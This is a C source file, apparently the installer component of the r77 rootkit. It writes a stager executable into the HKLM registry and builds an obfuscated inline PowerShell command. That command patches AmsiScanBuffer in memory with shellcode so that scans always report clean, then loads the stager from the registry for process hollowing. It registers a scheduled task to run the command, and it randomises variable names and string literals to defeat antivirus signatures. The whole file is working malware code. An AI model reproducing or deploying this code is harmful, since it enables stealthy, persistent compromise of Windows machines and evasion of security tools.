#include "Install.h"
#include "resource.h"
#include "r77def.h"
#include "r77win.h"
#include <wchar.h>
#include <Shlwapi.h>

int main()
{
	// Get stager executable from resources.
	LPBYTE stager;
	DWORD stagerSize;
	if (!GetResource(IDR_STAGER, "EXE", &stager, &stagerSize)) return 0;

	// Write stager executable to registry.
	// This C# executable is compiled with AnyCPU and can be run by both 32-bit and 64-bit powershell.
	// The target framework is 3.5, but it will run, even if .NET 4.x is installed and .NET 3.5 isn't.

	HKEY key;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &key) != ERROR_SUCCESS ||
		RegSetValueExW(key, HIDE_PREFIX L"stager", 0, REG_BINARY, stager, stagerSize) != ERROR_SUCCESS) return 0;

	// This powershell command loads the stager from the registry and executes it in memory using Assembly.Load().EntryPoint.Invoke()
	// The C# binary will proceed with creating a native process using process hollowing.
	// The powershell command is purely inline and doesn't require a ps1 file.

	LPWSTR powershellCommand = GetPowershellCommand();

	// Create scheduled task to run the powershell stager.
	DeleteScheduledTask(R77_SERVICE_NAME32);
	DeleteScheduledTask(R77_SERVICE_NAME64);

	LPCWSTR scheduledTaskName = Is64BitOperatingSystem() ? R77_SERVICE_NAME64 : R77_SERVICE_NAME32;
	if (CreateScheduledTask(scheduledTaskName, L"", L"powershell", powershellCommand))
	{
		RunScheduledTask(scheduledTaskName);
	}

	return 0;
}

LPWSTR GetPowershellCommand()
{
	// Powershell inline command to be invoked using powershell.exe "..."

	PWCHAR command = NEW_ARRAY(WCHAR, 16384);
	StrCpyW(command, L"\"");

	// AMSI bypass:
	// [Reflection.Assembly]::Load triggers AMSI and the byte[] with Stager.exe is passed to AV for analysis.
	// AMSI must be disabled for the entire process, because both powershell and .NET itself implement AMSI.

	// AMSI is only supported on Windows 10; AMSI bypass not required for Windows 7.
	if (IsAtLeastWindows10())
	{
		// Patch amsi.dll!AmsiScanBuffer prior to [Reflection.Assembly]::Load.
		// Do not use Add-Type, because it will invoke csc.exe and compile a C# DLL to disk.
		StrCatW
		(
			command,
			// Function to create a Delegate from an IntPtr
			L"function Local:Get-Delegate{"
			L"Param("
			L"[OutputType([Type])]"
			L"[Parameter(Position=0)][Type[]]$ParameterTypes,"
			L"[Parameter(Position=1)][Type]$ReturnType"
			L")"
			L"$TypeBuilder=[AppDomain]::CurrentDomain"
			L".DefineDynamicAssembly((New-Object Reflection.AssemblyName(`ReflectedDelegate`)),[Reflection.Emit.AssemblyBuilderAccess]::Run)"
			L".DefineDynamicModule(`InMemoryModule`,$False)"
			L".DefineType(`MyDelegateType`,`Class,Public,Sealed,AnsiClass,AutoClass`,[MulticastDelegate]);"
			L"$TypeBuilder.DefineConstructor(`RTSpecialName,HideBySig,Public`,[Reflection.CallingConventions]::Standard,$ParameterTypes).SetImplementationFlags(`Runtime,Managed`);"
			L"$TypeBuilder.DefineMethod(`Invoke`,`Public,HideBySig,NewSlot,Virtual`,$ReturnType,$ParameterTypes).SetImplementationFlags(`Runtime,Managed`);"
			L"Write-Output $TypeBuilder.CreateType();"
			L"}"

			// Use Microsoft.Win32.UnsafeNativeMethods for some DllImport's.
			L"$NativeMethods=([AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals(`System.dll`)})"
			L".GetType(`Microsoft.Win32.UnsafeNativeMethods`);"
			L"$GetProcAddress=$NativeMethods.GetMethod(`GetProcAddress`,[Reflection.BindingFlags](`Public,Static`),$Null,[Reflection.CallingConventions]::Any,@((New-Object IntPtr).GetType(),[string]),$Null);"

			// Create delegate types
			L"$LoadLibraryDelegate=Get-Delegate @([String])([IntPtr]);"
			L"$VirtualProtectDelegate=Get-Delegate @([IntPtr],[UIntPtr],[UInt32],[UInt32].MakeByRefType())([Bool]);"

			// Get DLL and function pointers
			L"$Kernel32Ptr=$NativeMethods.GetMethod(`GetModuleHandle`).Invoke($Null,@([Object](`kernel32.dll`)));"
			L"$LoadLibraryPtr=$GetProcAddress.Invoke($Null,@([Object]$Kernel32Ptr,[Object](`LoadLibraryA`)));"
			L"$VirtualProtectPtr=$GetProcAddress.Invoke($Null,@([Object]$Kernel32Ptr,[Object](`VirtualProtect`)));"
			L"$AmsiPtr=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryPtr,$LoadLibraryDelegate).Invoke(`amsi.dll`);"

			// Get address of AmsiScanBuffer
			L"$AmsiScanBufferPtr=$GetProcAddress.Invoke($Null,@([Object]$AmsiPtr,[Object](`AmsiScanBuffer`)));"

			// VirtualProtect PAGE_READWRITE
			L"$OldProtect=0;"
			L"[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectPtr,$VirtualProtectDelegate).Invoke($AmsiScanBufferPtr,[uint32]8,4,[ref]$OldProtect);"
		);

		// Overwrite AmsiScanBuffer function with shellcode to return AMSI_RESULT_CLEAN.
		if (Is64BitOperatingSystem())
		{
			// b8 57 00 07 80	mov		eax, 0x80070057
			// c3				ret
			StrCatW(command, L"[Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8,0x57,0,7,0x80,0xc3),0,$AmsiScanBufferPtr,6);");
		}
		else
		{
			// b8 57 00 07 80	mov		eax, 0x80070057
			// c2 18 00			ret		0x18
			StrCatW(command, L"[Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8,0x57,0,7,0x80,0xc2,0x18,0),0,$AmsiScanBufferPtr,8);");
		}

		// VirtualProtect PAGE_EXECUTE_READ
		StrCatW(command, L"[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectPtr,$VirtualProtectDelegate).Invoke($AmsiScanBufferPtr,[uint32]8,0x20,[ref]$OldProtect);");
	}

	// Load Stager.exe from registry and invoke
	StrCatW
	(
		command,
		L"[Reflection.Assembly]::Load"
		L"("
		L"[Microsoft.Win32.Registry]::LocalMachine"
		L".OpenSubkey(`SOFTWARE`)"
		L".GetValue(`" HIDE_PREFIX L"stager`)"
		L")"
		L".EntryPoint"
		L".Invoke($Null,$Null)"
	);

	StrCatW(command, L"\"");

	// Replace string literals that are marked with `thestring`.
	ObfuscatePowershellStringLiterals(command);

	// Obfuscate all variable names with random strings.
	ObfuscatePowershellVariable(command, L"Get-Delegate");
	ObfuscatePowershellVariable(command, L"ParameterTypes");
	ObfuscatePowershellVariable(command, L"ReturnType");
	ObfuscatePowershellVariable(command, L"TypeBuilder");
	ObfuscatePowershellVariable(command, L"NativeMethods");
	ObfuscatePowershellVariable(command, L"GetProcAddress");
	ObfuscatePowershellVariable(command, L"LoadLibraryDelegate");
	ObfuscatePowershellVariable(command, L"VirtualProtectDelegate");
	ObfuscatePowershellVariable(command, L"Kernel32Ptr");
	ObfuscatePowershellVariable(command, L"LoadLibraryPtr");
	ObfuscatePowershellVariable(command, L"VirtualProtectPtr");
	ObfuscatePowershellVariable(command, L"AmsiPtr");
	ObfuscatePowershellVariable(command, L"AmsiScanBufferPtr");
	ObfuscatePowershellVariable(command, L"OldProtect");

	return command;
}
VOID ObfuscatePowershellVariable(LPWSTR command, LPCWSTR variableName)
{
	DWORD length = lstrlenW(variableName);
	WCHAR newName[100];

	// Replace all ocurrences of a specified variable name with a randomized string of the same length.
	if (GetRandomString(newName, length))
	{
		for (LPWSTR ocurrence; ocurrence = StrStrIW(command, variableName);)
		{
			i_wmemcpy(ocurrence, newName, length);
		}
	}
}
VOID ObfuscatePowershellStringLiterals(LPWSTR command)
{
	// Replace all string literals like
	// `thestring`
	// with something like
	// 't'+[Char]123+[Char]45+'s' ...

	// Polymorphic modifications of strings is required, because something static like
	// 'ams'+'i.dll'
	// will eventually end up in a list of known signatures.

	PWCHAR newCommand = NEW_ARRAY(WCHAR, 16384);
	i_wmemset(newCommand, 0, 16384);

	LPBYTE random = NEW_ARRAY(BYTE, 16384);
	if (!GetRandomBytes(random, 16384)) return;

	LPWSTR commandPtr = command;
	LPBYTE randomPtr = random;

	for (LPWSTR beginQuote; beginQuote = StrStrIW(commandPtr, L"`");)
	{
		LPWSTR endQuote = StrStrIW(&beginQuote[1], L"`");
		DWORD textLength = beginQuote - commandPtr;
		DWORD stringLength = endQuote - beginQuote - 1;

		//  beginQuote   endQuote
		//         |        |
		//         v        v
		// .Invoke(`amsi.dll`);
		// ^------^              <-- textLength
		//          ^------^     <-- stringLength

		// Append what's before the beginning quote.
		StrNCatW(newCommand, commandPtr, textLength + 1);

		// Append beginning quote.
		StrCatW(newCommand, L"'");

		// Append each character using a different obfuscation technique.
		for (DWORD i = 0; i < stringLength; i++)
		{
			WCHAR c = beginQuote[i + 1];
			WCHAR charNumber[10];
			Int32ToStrW(c, charNumber);

			WCHAR obfuscatedChar[20];
			i_wmemset(obfuscatedChar, 0, 20);

			// Randomly choose an obfuscation technique.
			switch ((*randomPtr++) & 3)
			{
				case 0:
					// Put char as literal
					obfuscatedChar[0] = c;
					break;
				case 1:
					// Put char as '+'x'+'
					StrCatW(obfuscatedChar, L"'+'");
					StrNCatW(obfuscatedChar, &c, 2);
					StrCatW(obfuscatedChar, L"'+'");
					break;
				case 2:
				case 3:
					// Put char as '+[Char](123)+'
					StrCatW(obfuscatedChar, L"'+[Char](");
					StrCatW(obfuscatedChar, charNumber);
					StrCatW(obfuscatedChar, L")+'");
					break;
			}

			// Append obfuscated version of this char.
			StrCatW(newCommand, obfuscatedChar);
		}

		// Append ending quote.
		StrCatW(newCommand, L"'");

		commandPtr += textLength + stringLength + 2;
	}

	// Append remaining string after the last quoted string.
	StrCatW(newCommand, commandPtr);

	StrCpyW(command, newCommand);
	FREE(newCommand);
	FREE(random);
}